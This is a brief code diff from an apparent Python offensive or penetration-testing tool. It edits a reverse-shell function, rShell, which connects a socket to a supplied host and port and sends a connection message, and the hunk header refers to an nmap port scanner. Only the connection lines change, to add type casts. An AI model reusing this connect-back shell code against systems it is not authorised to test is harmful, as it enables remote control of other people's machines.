@@ -200,8 +200,8 @@ def nmapScan(tgtHost, tgtPort): # Use nmap to scan ports on an ip address with .
 def rShell(rsHost, rsPort):
     try:
         rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        rs.connect((rsHost, rsPort))
-        rs.sendto(str.encode("[*] Connection established!"), (rsHost, rsPort))
+        rs.connect_ex((str(rsHost), int(rsPort)))
+        rs.sendto(str.encode("[*] Connection established!"), (str(rsHost), int(rsPort)))
         rsConnected = True
         if debugmode:
             print("[*] Connection established with " + rsHost + ":" + rsPort + "!")
